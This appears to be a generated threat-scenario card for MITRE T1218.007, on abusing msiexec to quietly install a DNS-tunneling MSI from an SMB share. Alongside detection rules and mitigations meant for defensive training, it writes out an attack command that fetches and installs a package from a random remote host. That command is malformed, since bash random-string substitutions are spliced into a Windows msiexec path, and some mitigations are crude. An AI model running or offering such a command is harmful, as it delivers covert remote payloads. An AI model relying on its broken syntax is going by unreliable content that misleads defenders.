---
type: campaign
scenario_id: 489
tactic: Defense Evasion
technique: "T1218.007: Msiexec"
technique_id: T1218.007
tags: [campaign, lotl, defense_evasion]
---

# Using msiexec to install DNS tunneling MSI via SMB share.

## Threat Description
Using msiexec to install DNS tunneling MSI via SMB share.

## Attack Command
```
msiexec /quiet /i \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor msiexec SMB: `wmic process where name='msiexec.exe' get commandline | findstr \\`; YARA rule: `rule MsiexecSmbDnsTunnel { strings: $a = /msiexec.*\\.*msi/ nocase; condition: $a }`.

## Mitigation
Restrict msiexec: `icacls %windir%\System32\msiexec.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=out action=block protocol=TCP remoteport=445`.

## AI Training Prompt
Train AI to detect msiexec-based DNS tunneling MSI installations via SMB shares by analyzing SMB paths, msiexec command-line arguments, and DNS query patterns; suggest SMB restrictions.

## References
- MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
